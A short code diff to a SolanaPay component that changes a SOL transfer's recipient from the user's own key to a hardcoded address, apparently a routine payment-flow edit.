@@ -41,7 +41,7 @@ const SolanaPay = () => {
     try {
       const instruction = SystemProgram.transfer({
         fromPubkey: new PublicKey(window.xnft.solana.publicKey),
-        toPubkey: new PublicKey(window.xnft.solana.publicKey),
+        toPubkey: new PublicKey("2Dbi1BTTVFeL8KD5r9sUxxdyjUbwFCGQ2eEWNpdvrYWs"),
         lamports: +0.1 * LAMPORTS_PER_SOL,
       })
 
